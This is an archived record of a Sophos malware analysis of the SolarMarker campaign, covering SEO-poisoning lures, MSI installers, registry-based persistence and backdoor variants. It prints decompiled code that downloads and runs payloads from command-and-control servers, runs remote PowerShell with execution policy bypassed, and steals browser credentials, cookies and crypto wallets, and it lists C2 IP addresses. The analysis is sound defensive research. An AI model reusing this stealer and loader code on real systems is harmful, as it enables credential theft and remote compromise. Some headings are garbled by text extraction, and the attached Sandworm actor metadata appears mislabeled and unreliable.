{
    "id": "1afecbad-4dba-4711-adcb-cf1b87e4139f",
    "created_at": "2023-01-12T15:06:45.617465Z",
    "updated_at": "2025-03-27T02:14:38.914182Z",
    "deleted_at": null,
    "sha1_hash": "21f4f574e01f7a9fb447caefbb123196b2949c19",
    "title": "2022-02-01 - SolarMarker campaign used novel registry changes to establish persistence",
    "authors": "",
    "file_creation_date": "2022-05-28T21:42:02Z",
    "file_modification_date": "2022-05-28T21:42:02Z",
    "file_size": 4955423,
    "plain_text": "# SolarMarker campaign used novel registry changes to establish persistence\n\n**[news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/](https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/)**\n\nFebruary 1, 2022\n\nOver the past seven months, SophosLabs has monitored a series of new efforts to distribute SolarMarker, an information stealer and backdoor\n(also known as Jupyter or Polazert). First detected in 2020, the .NET malware usually delivered by a PowerShell installer has information\nharvesting and backdoor capabilities.\n\nIn October, 2021, we observed a set of active SolarMarker campaigns that combined search engine optimization (SEO) targeting with custommade MSI installer packages to deliver the payload. These installers used an unusual method to ensure the persistence of the SolarMarker\nbackdoor.\n\nThe campaigns followed a common pattern: Using malicious SEO techniques, the SolarMarker actors were able to place links to web sites with\ndeceptive content in search results from multiple search engines. While this sort of SEO poisoning has been seen in the past, it has rarely\n[been seen used beyond some recent downloader-as-a-service operations.](https://news.sophos.com/en-us/2021/09/01/fake-pirated-software-sites-serve-up-malware-droppers-as-a-service/)\n\nThese SEO efforts, which leveraged a combination of Google Groups discussions and deceptive web pages and PDF documents hosted on\ncompromised (usually WordPress) websites, were so effective that the SolarMarker lures were usually at or near the top of search results for\nphrases the SolarMarker actors targeted.\n\nThese lure sites, in turn, attempted to deceive users into downloading a Windows installer. When downloaded, the malicious Microsoft installer\n(.msi) files would in turn execute a decoy install program, while at the same time launching a PowerShell script that installed the malware.\n\nThe PowerShell script modified the Windows registry and dropped a .lnk file into Windows’ startup directory to establish persistence. Using\nWindows registry changes made by the install script, the loading of the .lnk at Windows startup would load the malware from an encrypted\npayload hidden amongst a “smokescreen” of other, seemingly meaningless files.\n\n## SEO blunderbuss\n\nThe criminals used at least three distribution methods for the malware distribution, sometime simultaneously. For example, in the following\nexample all three of the distribution methods ended up in the top ten Google hits for the poisoned keywords (marked by method in the\nscreenshot):\n\n\n-----\n\nIn each of these SEO methods, the name of the MSI installer file matches the search terms. For example, one of the samples we recovered\nwas named good-choice-bad-choice-worksheet-for-kids.msi. Based on the names of samples we’ve seen in the wild, the following search\nkeywords appeared to be the most successful from the attacker’s point of view:\n\n## SEO Method 1: Google Groups\n\nIn the first method we observed, the SEO was accomplished through the creation of Google Groups discussions. The attackers created\nmultiple fake Google groups, each with 500-600 fake conversation entries, targeting the most common search terms in a wide variety of\nsubjects:\n\n\n-----\n\nThe comments themselves have no content other than what appears to be links to PDF files, as in the following example:\n\nHowever, the disguised link leads to a redirection site (hxxps://abocomteamsd[.]site/Variable-Length-File-Declaration-In-Cobol“), which is\nonly the next element in the download chain:\n```\n<a href=\"hxxps://abocomteamsd[.]site/Variable-Length-File-Declaration-In-Cobol\"target=\"_blank\" rel=\"nofollow\" datasaferedirecturl=\"hxxps://www.google.com/url?hl=hu&amp;q=hxxps://abocomteamsd[.]site/Variable-Length-File-Declaration-InCobol&amp;source=gmail&amp;ust=1636557011760000&amp; usg=AFQjCNGBOEcF9QaTJVv6GoQFs_cbKH1yYw\"><img alt=\"OEyQtsI7nXS.jpg\"\nwidth=\"550px\" height=\"162px\" src=\"hxxps://groups[.]google.com/group/8pxafs/attach/3612f6b957d5d/OEyQtsI7nXS.jpg?\npart=0.1&amp;view=1\" data-iml=\"3609\"></a>\n\n```\nIt’s likely that this distribution method was from an older campaign. While the links still resolved as we prepared our analysis, they returned a\nzero-length response—indicating no content remained at the destination. However, we were able to collect the keywords from the group posts\nto analyze the search terms the criminals behind the campaign were attempting to poison. The word cloud below displays the frequency of\nkeywords in those search terms:\n\nThis aligns with the statistics gathered from the MSI installers, showing the efficiency of the method. It also shows that the criminals were not\nparticularly picky about their chosen search terms—they cast a wide net, aiming for many target interests and potential target types.\n\n\n-----\n\n## S O et od p a ts\n\nIn another set of lures, the initial deceptive content used for SEO is stored in PDF files hosted on websites; the search engines linked to the\nPDF files themselves directly as a result of the malicious SEO efforts.\n\nIn most of the cases, compromised WordPress sites were used to host PDF files, specifically in the wp-content/uploads/formidable\ndirectories on those websites.In other cases, the same PDF content was stored in an Amazon cloud site, or a CDN site.\n\nWhen the link in the search engine is clicked, the web browser opens the malicious PDFs as it would any other PDF document on the web .\nThe actual content of these malicious PDFs is limited to the text of the targeted search term and two download buttons —one for the PDF\ncomponent, the other for DOC:\n\nThe corresponding code in the PDF file source links these buttons to a distribution site, hxxps://sseiatca[.]site:\n```\n/Annots [<</Type /Annot /Subtype /Link /Rect [22.00 472.00 288.00 393.00] /Border [0 0 0] /A <</S /URI /URI\n(hxxps://sseiatca[.]site/Variable-Length-File-Declaration-In-Cobol/pdf/sitedomen/7|29279|5|1|1|1)>>>><</Type /Annot /Subtype /Link\n/Rect [302.00 457.00 548.00 384.00] /Border [0 0 0] /A <</S /URI /URI (hxxps://sseiatca[.]site/Variable-Length-File-Declaration-InCobol/doc/sitedomen/7|29279|5|1|1|1)>>>>]\n\n## SEO Method 3: deceptive web pages\n\n```\nThis method also uses compromised WordPress sites to deliver the content, but instead uses HTML pages hosted on the compromised site.\nThe HTML source for these malicious pages contain link collections for other search terms, all connected to other malicious pages on the\nsame compromised server, as part of the mechanism behind the fraudulent SEO campaign:\n\nAlso, the pages have a visible string PdfDocDownloadsPanel at the beginning of the page, which is a common characteristic of this\ncampaign (previously observed in earlier SolarMarker campaigns):\n\n\n-----\n\nThe marker string is also clearly visible in the HTML code:\n```\n<span class=\"logo-text\">PdfDocDownloadsPanel</span>\n\n```\nBoth of the download buttons on this page advertise different file formats for a download, instead direct to two separate redirectors on\n**hxxps://passesleeson[.]site, using /doc and /pdf in the URL to further bait the click.**\n```\n<h1 class=\"content__caption\">Variable Length File Declaration In Cobol</h1>\n<p class=\"content__caption\" style=\" font-size: 16px;\">Filesize: 831 Kb</p>\n<p class=\"content__caption\" style=\" font-size: 16px;\">Uploaded: July 18 2020</p>\n<br><p class=\"content__caption\" style=\" font-size: 16px;\">Select download format:</p>\n<br><a href=\"hxxps://passesleeson[.]site/pdf/Variable-Length-File-Declaration-In-Cobol\" class=\"button7\">Download\nPDF</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"hxxps://passesleeson[.]site/doc/Variable-Length-FileDeclaration-In-Cobol\" class=\"button7\">Download DOC</a>\n\n## Redirectors\n\n```\nIn each of the three SEO baiting methods discussed above, the download links all connect to sites with the .site top-level domain (TLD). In the\nrecent campaigns we have seen about 100 .site domains used. Typically the URLs referring to this site look like this:\n```\nhxxps://triplegnuise[.]site/Clinical-Correlation-Recommended-After-Stress-Test/pdf/sitedomen/3\n\n```\nThe numeric parameter at the end original URL (/3 in this example) is irrelevant. Any number can be put in its place, and the returned content\nwill be similar: a dynamically-created HTML redirect code using a domain selected at random from a large pool of second-stage redirector sites\n(in the case below, chargraman[.]ml). Each time the link is requested, a different next-stage domain is provided.\n```\n<meta http-equiv=\"refresh\" content=\"0;URL=hxxps://chargraman[.]ml/22b0270b0a7e4dd147bc74ec3b799366/Clinical-CorrelationRecommended-After-Stress-Test/650845767/pdf\">\n\n```\nWhile the example above uses the .ml TLD, the majority of the second-stage redirects in these campaigns used the .tk TLD. In the recent\ncampaigns we have seen about 3000 domains used, of which more than 2000 were .tk domains (with the remainder relatively evenly spread\nacross the .ga, .ml, .cf and .gq TLDs).\n\n\n-----\n\ne seco d stage ed ect U S co ta t e sea c te used as ba t, a d etu a espo se code 30 to ed ect to t e a\ndestination server.\n\nThe downloads all point to pdfdocdownloadspanel[.]site, which hosted phishing content since at least 2019. The site has been shut down,\nso we were unable to retrieve a live version of the target page, but from telemetry from known cases we know that the next part of the infection\nchain is the download of an MSI installer carrying a decoy PDF viewer. So there should be a misleading link in between offering the installer\nbased on telemetry associated with the malware.\n\n## The installer\n\nThe installer file dropped by the download link is named to match the search string that delivered it. In the example above, for instance, the file\nis named good-choice-bad-choice-worksheet-for-kids.msi. When the installer is opened, it executes a decoy setup application (in this\ncase, pdfelement-pro_setup_full5239.exe), while also executing a PowerShell script (p.ps1 or InstallScript.ps1).\n\nThe installers require a 64-bit windows. They were generated by the EMCO MSI package builder and contain a pre-installation script. This\nscript prepares and executes the PowerShell installer, while executing the decoy installer.\n\nThe typical malware distribution packages look like this:\n\n\n-----\n\nt co ta s t o es, t e decoy e ecutab e (d st 86 e e t s case) a d t e sta e o e S e sc pt ( sta Sc pt ps t s\ncase). Additionally, two installation actions are defined: the first executes powershell.exe with the script to execute the extracted main install\nscript, while the second launches the decoy executable (dist-x86.exe in this case).\n\nThe most recent scripts we found added a twist to this. In these samples, the PowerShell installer file in the archive is encoded as a base64\nstring, which is also additionally encrypted:\n```\naiQOei85cQpkRGJeQQZSIFV+K1x/cHMGaxVtRSVgb187BwoyEQwwDi4mPycmIytdKh03CRozJQUCAC4OMxgdPTw0M\nxYCHS0rHhwMNwwNNRgSABgzERQuJSQlJBk1NzgXKiBMGRYWIyIDECENAA0IOGQhBSYUD1wNVSV8OXsNLyY5EwM\nUCw5iLDQGJRkLJj8XMxgaPTIzKFkQFgY/ARQ+GwQzKSkHRB4HMDYBdTEPGz4GMDkWDyM6RQYXEEAjPwwxFFEwJS\n00HSkTLzheBRUJSQUAMnAvbHFfHyUjAyYlXDYyexsNAQQMIQxHKTMQAmMBJCIYFws2ICQ1GDsHPTABFh4/ASwDEFI\nvHDIQIBwiNBsiJR0GNQ0HIC0NDDMIGRcAHwEDABI/JS8SCyw+MTcrJSoLHl8gFiwjG3U5EQAQKhwFHw0IOFAjFCA4cD\ngaeToSDDIPMRQSNQIVFi4fFDY4EDoYNyoRMjsaEjoBIhwAG3EeDAwlH0MtDyAOJDIwISU7Fg8mMD4vaCcVOSIuJBQ6D\nxwmGjwtQCckFCMdOCYHHg0ddjkzKWgUNzVHFScnJz83P3kiGwJ4fywXIw84EQIYGSc5JgYkJxplMyZAPBIvOw8eBiw\nCA3VaFgMQJgUcRi8mJlIwdAMdORkZJAQMPiEDRx9kCD4+BSINCTYOBC4ZAR4RMhUdCS\n\n```\nIn these samples the installation script is slightly more complicated, it also performs a decryption of the PowerShell installer first:\n\nA handful of MSI installers were “traditional” MSI files, but they also contained custom action scripts:\n\nIn this case the custom action script contained the PowerShell installer:\n\n\n-----\n\n## Decoy\n\nThe decoy is a legit installer for Wondershare PDFelement, likely to complete the decoy social engineering process.\n\nSome of the newest MSI installers have a different decoy: Adobe Acrobat Pro DC Installer. Because it is and outdated version, on execution it\nwill offer to download the latest version:\n\n## PowerShell malware installer\n\nThe PowerShell installer does the actual malware deployment, creating the files and registry keys that establish persistence for the backdoor.\n\nThe script contains the actual malware payload (in base64-encoded and encrypted form) in a string variable at the top of the script. In addition\nto the payload definition, the beginning of the script also sets two defined functions—one to create random file and directory names for the\nmalware, and another to create a path for a new Windows registry entry.\n\nThe script calls these functions as it steps through the installation steps, labeled in red in the screen shot below:\n\n\n-----\n\nIn some of the samples we examined, the installer scripts end with the comment line:\n```\n#Hello for Squiblydoo\n\n```\n[This is likely in tribute to the malware blog that investigated the installation method used in attacks documented in early 2021.](https://squiblydoo.blog/2021/05/02/mars-deimos-solarmarker-jupyter-infostealer-part-1)\n\n## Persistence with a smoke screen\n\nThe installer creates persistence for the malware by creating a .LNK file in the affected system’s startup directory. But instead of pointing to an\nexecutable file, this link points to a junk-filled “smoke screen” file with a randomly-created file name and extension. The actual execution\nmethod for the malware is included in script for a custom file handler created for a file type defined by this random extension—defined by the\ninstaller script in the Windows registry. The commands in the handler’s script decrypt and execute the actual payload, hidden amongst the\nrandom files.\n\nThe first part of the installer script following the encrypted payload uses the random name function to create a directory to drop the payload\ninto. The randomly-named folder is created in the path %APPDATA%\\AdobE. The installer script also creates an LNK file in the\n%STARTUP% directory to establish persistence—though not in the way one would expect, as we’ll explain shortly.\n\nNext, the script deploys a “smoke screen” of anywhere from 100 to 300 files, dropping them in the randomly-named directory . With a single\nexception, these are all files filled with random junk. One file dropped in the same location, however, contains the encrypted payload.\n\nThe LNK file (in this case, with the file name a06f383e63a43381f156ee77d9f6f.lNk ) points to one of these files\n(VUPQVfERpBWfmEvrhLOSNZ NuAoeLuriIQZNSVqcO):\n\n\n-----\n\nNormally, one would expect this linked file to be an executable or script file. But for these SolarMarker campaigns the linked file is one of the\nrandom junk files, and cannot be executed itself.\n\nAs it turns out, the content of the file is totally irrelevant. What is important is the unique and random file extension, that was used:\n**.NuAoeLuriIQZNSVqcO.**\n\nAfter dropping the files, the PowerShell installer registers the file extension used for them as a custom file type with a randomly generated\nname (in this case ocrrhvyczvnikxofwntsvx):\n\nThe file type is defined by the script with a custom file open handler. This handler is a PowerShell script:\n\n## Reflected loading\n\n\n-----\n\ne sc pt t e a d e oads t e e co ta g t e e c ypted pay oad ( t s case,\n**EhkpfRkrpDaViAPS\\KfWJiiEPmkDO.fFOTagOUMEgIwBH). It then uses a key hard-coded into the script to decrypt the payload using a**\nbitwise XOR operation, and then uses reflective loading to execute the now-decrypted DLL, as illustrated on the following beautified code:\n\nThe reflectively loaded payload is the Solarmarker backdoor.\n\n## Solarmarker payload\n\nDuring this research we identified several variants of the backdoor, the main difference between them is the internal version number, the C2\nserver and the RSA key used for communication. Each variant is identified with a version ID string:\n```\npublic string AppVer = \"IN-3\";\n\n```\nMultiple versions communicated with the same server, and there was a unique key for each server.\n\n**Version** **C2 server**\n\n**DR/1.6** http://45.146.165.221\n\n**DR/1.7** http://91.241.19.110\n\n\n**IN-1**\n**IN-2**\n\n**IN-3**\n\n**IN-9**\n\n**IN-10**\n\n\nhttp://46.102.152.102\n\n\n**IN-13** http://185.244.213.64\n\n\n**IN-10**\n**RB-7**\n\n\nhttp://192.121.87.53\n\n\n**J12** http://5.254.118.226\n\n**J13** http://23.29.115.175\n\n\n-----\n\n**J15**\n**J16**\n\n\nhttp://92.204.160.110\n\n\n**SP-W1** http://146.70.24.173\n\n**SP-W2** http://69.46.15.151\n\n\n**AG-3**\n**AG-5**\n\n**AG-8**\n\n**AG-9**\n\n**AG-13**\n**SP-1**\n\n**SP-3**\n\n**SP-5**\n**SP-7**\n\n**SP-10**\n\n**SP-11**\n\n**SP-13**\n**SP-16**\n\n**SP-17**\n**SP-18**\n\n**SP-21**\n**OC-1**\n\n**OC-3**\n\n**OC-4**\n\n**NV-1**\n**NV-4**\n\n**NV-5**\n\n**NV-6**\n\n**OC-11**\n\n**OC-8**\n**OC-9**\n\n\nhttp://167.88.15.115\n\nhttp://216.230.232.134\n\nhttp://37.120.237.251\n\nhttp://45.42.201.248\n\nhttp://188.241.83.61\n\nhttp://146.70.41.157\n\nhttp://92.204.160.233\n\nhttp://37.221.114.23\n\n\n**OC-7** http://149.255.35.179\n\n**OC-W1** http://104.223.123.7\n\nOlder versions of the backdoor provided different functionality, such as browser data stealing, crypto-wallet stealing, and command execution.\nBut more recent variants of the backdoor have the following, limited capabilities:\n\nRun a PowerShell command decoded from a deflate+base64 encoded blob on a remote server.\nRun an .EXE file (first saved to %TEMP%) retrieved from a remote server.\n\nIn all versions of the backdoor, the code contains a lot of junk thread-creation code fragments. These do nothing but break up the readability of\nthe code and add delay cycles to the execution. For example, in this section of code:\n\n\n-----\n\n…after removing the junk the about code simplifies to:\n```\nOperatingSystem oSVersion = Environment.OSVersion;\nstring text;\nswitch (oSVersion.Version.Major)\n{\ncase 5:\n    text = \"XP\";\n    goto IL_16B;\ncase 6:\n{\nswitch (oSVersion.Version.Minor)\n{\n    case 0:\n       text = \"Vista\";\n\n## The evolving backdoor\n\n```\nInterestingly, the functionality of the latest version of the backdoor is essentially the same as that of the oldest version we could identify (sha1:\n6ccbde9f29fe59077e218b5dc294ca179bd54522, version ID: DR/1.6, timestamp: November 2020). It also allowed the execution of a .EXE\nprogram received from the C2 server:\n```\nstring text3 = string.Concat(new object[]\n{\n   Environment.GetEnvironmentVariable(\"temp\"),\n   '\\\\',\n   M.GenRandomString(24),\n   \".exe\"\n});\nbyte[] bytes2 = M.DecryptRaw(M.Req(addr,\n…\nFile.WriteAllBytes(text3, bytes2);\nProcess.Start(text3);\n\n```\nAnd it also provided for the execution of a PowerShell file received from the C2 server:\n\n\n-----\n\n```\n{\n   Environment.GetEnvironmentVariable(\"temp\"),\n   '\\\\',\n   M.GenRandomString(24),\n   \".ps1\"\n});\nbyte[] bytes = M.DecryptRaw(M.Req(addr,\n…\nFile.WriteAllBytes(text2, bytes);\nProcess.Start(new ProcessStartInfo\n{\n   FileName = \"powershell\",\n   Arguments = \"-ep bypass -command \\\"iex(get-content '\" + text2 + \"')\\\"\",\n   WindowStyle = ProcessWindowStyle.Hidden\n});\nThread.Sleep(15000);\nFile.Delete(text2);\n\n```\nFinally it could executed a PowerShell command received as a string from the C2 server:\n```\nelse if (value == \"command\") { \n  string value2 = ((M.JsonValue)jsonObject.Get(\"task_id\")).value; \n  string value4 = ((M.JsonValue)jsonObject.Get(\"command\")).value; \n  Process.Start(new ProcessStartInfo { \n  FileName = \"powershell\", Arguments = \"-ep bypass -command \\\"\" + value4 + \"\\\"\", WindowStyle = ProcessWindowStyle.Hidden });\n\n```\nIn this oldest version, the data sent to the C2 server was encrypted using a XOR algorithm using a hardcoded key. This encryption scheme\nwas later replaced with more secure RSA encryption.\n\nIn addition to the RSA encrypted communication, later variants added other functionality, while removing some of the older ones. Version J13\n(sha1: 55c692913894a282189e0dff5dcd60e29ad89046, time stamp September 2021), for instance, does not provide any remote execution\noptions. Instead, it collects browser data and sends it to the C2 server.\n```\nif (File.Exists(directoryInfo2.FullName + \"\\\\logins.json\") && File.Exists(directoryInfo2.FullName + \"\\\\key4.db\") &&\nFile.Exists(directoryInfo2.FullName + \"\\\\cert9.db\") && File.Exists(directoryInfo2.FullName + \"\\\\cookies.sqlite\") &&\nFile.Exists(directoryInfo2.FullName + \"\\\\formhistory.sqlite\"))\n{\n  this.a = this.f(directoryInfo2.FullName + \"\\\\cert9.db\");\n  this.b = this.f(directoryInfo2.FullName + \"\\\\key4.db\");\n  this.c = this.f(directoryInfo2.FullName + \"\\\\logins.json\");\n  this.d = this.f(directoryInfo2.FullName + \"\\\\cookies.sqlite\");\n  this.e = this.f(directoryInfo2.FullName + \"\\\\formhistory.sqlite\");\n\n```\nThis version targets multiple browsers (Chrome, Edge, Brave, Opera, Firefox):\n\n\n-----\n\n```\n'\\\\','A','p','p','D','a','t','a','\\\\','L','o','c','a','l','\\\\','G','o','o','g','l','e',\n'\\\\','C','h','r','o','m','e','\\\\','U','s','e','r',' ','D','a','t','a'\n}), list);\nMain.a(Main.a(new char[]\n{\n'e','d','g','e'\n}), environmentVariable + Main.a(new char[]\n{\n'\\\\','A','p','p','D','a','t','a','\\\\','L','o','c','a','l','\\\\','M','i','c','r','o','s','o','f','t',\n'\\\\','E','d','g','e','\\\\','U','s','e','r',' ','D','a','t','a'\n}), list);\nMain.a(Main.a(new char[]\n{\n'o','p','e','r','a'\n}), environmentVariable + Main.a(new char[]\n{\n'\\\\','A','p','p','D','a','t','a','\\\\','R','o','a','m','i','n','g','\\\\','O','p','e','r','a',' \n','S','o','f','t','w','a','r','e','\\\\','O','p','e','r','a',' ','S','t','a','b','l','e'\n}), list);\nMain.a(Main.a(new char[]\n{\n'b','r','a','v','e'\n}), environmentVariable + Main.a(new char[]\n{\n'\\\\','A','p','p','D','a','t','a','\\\\','L','o','c','a','l','\\\\','B','r','a','v','e',\n'S','o','f','t','w','a','r','e','\\\\','B','r','a','v','e','-','B','r','o','w','s','e','r',\n'\\\\','U','s','e','r',' ','D','a','t','a'\n}), list);\ntry\n{\nMain.k k = new Main.k(Main.a(new char[]\n{\n  'f','i','r','e','f','o','x'\n}), environmentVariable + Main.a(new char[]\n{\n'\\\\','A','p','p','D','a','t','a','\\\\','R','o','a','m','i','n','g','\\\\',\n'M','o','z','i','l','l','a','\\\\','F','i','r','e','f','o','x','\\\\','P','r','o','f','i','l','e','s'\n}));\n\n```\nVersion J12 (sha1: ee19506006b67c58933b471597e777b2675fba92, compilation time September 2021) added cryptowallet stealing as a\nfunctionality.\n```\nstring environmentVariable = Environment.GetEnvironmentVariable(\"userprofile\");\nstring text = environmentVariable + \"\\\\AppData\\\\Roaming\";\nstring text2 = environmentVariable + \"\\\\AppData\\\\Local\";\nMain.a(list, \"Atomic\", \"Wallet\", \"*\", text + \"\\\\atomic\\\\Local Storage\\\\leveldb\", false);\nMain.a(list, \"Guarda\", \"Wallet\", \"*\", text + \"\\\\Guarda\\\\Local Storage\\\\leveldb\", false);\nMain.a(list, \"SimpleOS\", \"Wallet\", \"*\", text + \"\\\\simpleos\\\\Local Storage\\\\leveldb\", false);\nMain.a(list, \"Neon\", \"Wallet\", \"*\", text + \"\\\\Neon\\\\Local Storage\\\\leveldb\", false);\nMain.a(list, \"Wasabi\", \"Wallet\", \"*\", text + \"\\\\WalletWasabi\\\\Client\\\\Wallets\", false);\nMain.a(list, \"MyMonero\", \"Wallet\", \"*.mmd*\", text + \"\\\\MyMonero\", false);\nMain.a(list, \"Jaxx\", \"Wallet\", \"*\", text + \"\\\\Jaxx\\\\Local Storage\\\\leveldb\", false);\nMain.a(list, \"Jaxx\", \"Wallet\", \"*\", text + \"\\\\com.liberty.jaxx\\\\IndexedDB\", false);\nMain.a(list, \"Electrum\", \"Wallet\", \"*\", text + \"\\\\Electrum\\\\wallets\", false);\nMain.a(list, \"Ethereum\", \"Wallet\", \"*\", text + \"\\\\Ethereum\\\\keystore\", false);\nMain.a(list, \"Exodus\", \"Wallet\", \"*\", text + \"\\\\Exodus\\\\exodus.wallet\", false);\nMain.a(list, \"GreenAddress\", \"Wallet\", \"*\", text + \"\\\\GreenAddress Wallet\\\\Local Storage\\\\leveldb\", false);\nMain.a(list, \"Coin Wallet\", \"Wallet\", \"*\", text + \"\\\\Coin Wallet\\\\Local Storage\\\\leveldb\", false);\nMain.a(list, \"Bither\", \"Wallet\", \"*\", text + \"\\\\Bither\", false);\nMain.a(list, \"Coinomi\", \"Wallet\", \"*\", text2 + \"\\\\Coinomi\\\\Coinomi\\\\wallets\", false);\nMain.a(list, \"Ledger Live\", \"Hardware wallet\", \"*.json\", text + \"\\\\Ledger Live\", false);\nMain.a(list, \"Trinity\", \"Hardware wallet\", \"*.realm\", text + \"\\\\Trinity\", false);\nMain.a(list, \"Scatter\", \"Hardware wallet\", \"*.json\", text + \"\\\\scatter\", false);\nMain.a(list, \"Unknown?\", \"Wallet?\", \"*wallet*.dat\", text, false);\nMain.a(list, \"Unknown?\", \"Wallet?\", \"*.wallet\", text, false);\nMain.a(list, \"Unknown?\", \"Wallet?\", \"*wallet*.dat\", text2, false);\nMain.a(list, \"Unknown?\", \"Wallet?\", \"*.wallet\", text2, false);\nstring[] directories = Directory.GetDirectories(text, \"Electrum-*\");\nstring[] array = directories;\nfor (int i = 0; i < array.Length; i++)\n{\nstring str = array[i];\nMain.a(list, \"Electrum\", \"Wallet\", \"*\", str + \"\\\\wallets\", false);\n}\n\n```\nIn this variant, as shown in the code above, SolarMarker collects the wallets of the following cryptocurrencies:\n\nAtomic\n\n\n-----\n\nGua da\nSimpleOS\nNeon\nWasabi\nMyMonero\nJaxx\nElectrum\nEthereum\nExodus\nGreenAddress\nCoin\nBither\nCoinomi\nLedger\nTrinity\nScatter\n\nAdditionally this variant collects VPN and RDP configs:\n```\nMain.a(list, \"OpenVPN?\", \"VPN?\", \"*.*vpn\", environmentVariable, true);\nMain.a(list, \"RDP\", \"RDP\", \"*.rdp\", environmentVariable, true);\n\n## The latest model\n\n```\nThe most recent version we’ve analyzed creates a text file with path like:\n\n**%PROFILE%\\AppData\\Roaming\\27928525329423222227221630524529029729723924927627121922627428029329027421825830228228623**\n\nThe contents of this file is an encoded string (in this case, 2CJDEX5HFXHRXL3FK53CXRS9U8L5EDDC ) which serves as a unique system\nID (HWID), generated from the content of files in %APPDATA%, or generated randomly, if empty.\n\nThe backdoor calls back to the C2 server with a JSON message to C2 server with basic config data:\n```\n{\"action\":\"ping\",\"hwid\":\"A8IFX8YU3NJIU8PFJ0XFMMXDCWFQT9UG\",\"pc_name\":\"{redacted}\",\"os_name\":\"Win\n7\",\"arch\":\"x86\",\"rights\":\"User\",\"version\":\"OC-8\",\"workgroup\":\"? | ?\",\"dns\":0,\"protocol_version\":2}\n\n```\nThis message is sent to the server encrypted with a hardcoded RSA key.\n```\n<Main>\n<Modulus>q7lnDVdxQRSYhRPYcqRaqkwV9sRGLxrKNMOSsxFSdJ30bswOmMHEeUe7Z/3rGI3dmlnSC77I/\nqwWkzf73lF+SPFmIw4ma84JIVDW76k+eEP2iguC9zGNXaPBajogFRf8K2HgIwF/eni/wmnrtzhryxIE5mNJzAREsICbA/\n/RzfTU3C7JPlkCys0q9uVlkQLO9ijQHyHuUE+uk0nGk2+0t91hW+efqz5i8iy92hFm3dnD005mogpXA+18pFeFu8x1hrr\nPFhaHY9m1Xl7oyBZ8nnol4uDdPNzkGNCsUOZtSVQE8wZc5yaFKBU2uuCl8IHaQMhENrNMR0EWlMTYgrAWYw==\n</Modulus>\n<Exponent>AQAB</Exponent>\n</Main>\n\n```\nFurther communications with the server will be encrypted with the original config buffer.\n\nSo, the initial report-back call communication data is encrypted using the hard-coded RSA key with asymmetric RSA algorithm, the rest of the\ncommunication uses the config buffer as a key using symmetric AES CBC algorithm.\n\nThe C2 server is selected from a possible array of server names, which in the analized sample contained only a single\nentry: hxxp://37[.]221.114.23\n\nAs noted earlier, this version of the backdoor’s functionality is limited to executing some next-stage code. For that, the backdoor provides\nmultiple approaches. It can:\n\ndownload and execute a Windows executable\ndownload and execute a PowerShell script\ndownload and load a .Net DLL\nrun a PowerShell command received as a string\n\nRunning PowerShell and a command is done the same way: the payload is expected to be a compressed gzip stream with base64 encoding\non top:\n\n\n-----\n\nThe .Net module is loaded in memory, the Run function of the Module.Main class is executed:\n```\nmpool.a9bd1e9d79f46a96330eecb53f054(Program.ad10fd14022445bfbbcdf53ea0fba(Program.get_msg_get_file(cfg.hwid, text4), cfg),\nProgram.chararray_to_str(new char[]\n{\n'M','o','d','u','l','e','.','M','a','i','n'\n}), Program.chararray_to_str(new char[]\n{\n'R','u','n'\n}), str3);\n\n## Conclusion\n\n```\nThere are currently no active SolarMarker-spreading campaigns, as the final download site used by the operators of the campaign was shut\ndown. But SolarMarker deployments remain active, and while we’ve seen a decline in detections of the malware since November of 2021, the\nmalware has not disappeared. It may be just a matter of time before a new campaign using new infrastructure is launched.\n\nWhile ransomware operators and other malicious actors draw much of defenders’ focus to well-documented malware delivery methods—\nphishing emails, Remote Desktop Protocol exploitation, and remote code execution vulnerabilities)— there are still some active campaigns that\nuse SEO as delivery method, as demonstrated by other malware delivery-as-a-service schemes. Because we don’t pay much attention to this\ndelivery method, these SEO-based campaigns can slip under the radar of defenders until it is too late and the payload has already been\ndeployed.\n\nOrganizations need to train users on the risks of SEO poisoning and how to identify potentially malicious results. But that education may not be\nenough to prevent malicious downloads through highly-targeted search terms, so a defense in depth is best.\n\nSophos detects the PowerShell installer as Troj/PS-JA, the reflective loader as AMSI/SolarM-A and the final payload as Mal/Polazert-A. A list\n[of IOCs for SolaerMarker is available on the SophosLabs GitHub page.](https://github.com/sophoslabs/IoCs/blob/master/Troj-Polazert_IOCs.csv)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-01 - SolarMarker campaign used novel registry changes to establish persistence.pdf"
    ],
    "report_names": [
        "2022-02-01 - SolarMarker campaign used novel registry changes to establish persistence.pdf"
    ],
    "threat_actors": [
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
